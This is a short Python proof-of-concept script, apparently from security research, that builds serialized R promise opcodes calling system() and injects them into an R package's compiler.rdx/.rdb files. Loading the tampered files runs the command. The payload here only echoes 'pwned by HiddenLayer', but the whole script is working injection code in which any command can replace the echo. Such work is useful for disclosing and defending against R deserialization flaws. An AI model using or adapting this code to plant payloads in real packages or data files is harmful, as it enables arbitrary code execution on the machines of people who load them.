from hiddenpromise.injector import inject_code
from hiddenpromise.compiler import Opcode, TYPES
import os

instructions = [
    Opcode(TYPES.PROMSXP, 0, False, False, False,None,False),

    Opcode(TYPES.UNBOUNDVALUE_SXP, 0, False, False, False,None,False),

    Opcode(TYPES.LANGSXP, 0, False, False, False,None,False),
    Opcode(TYPES.SYMSXP, 0, False, False, False,None,False),
    Opcode(TYPES.CHARSXP, 64, False, False, False,"system",False),
    Opcode(TYPES.LISTSXP, 0, False, False, False,None,False),
    Opcode(TYPES.STRSXP, 0, False, False, False,1,False),
    Opcode(TYPES.CHARSXP, 64, False, False, False,'echo "pwned by HiddenLayer"',False),
    Opcode(TYPES.NILVALUE_SXP, 0, False, False, False,None,False),
]

if __name__ == "__main__":
    inject_code(f"..{os.sep}example_files{os.sep}compiler.rdx", f"..{os.sep}example_files{os.sep}compiler.rdb", b"notifyBadCall", instructions)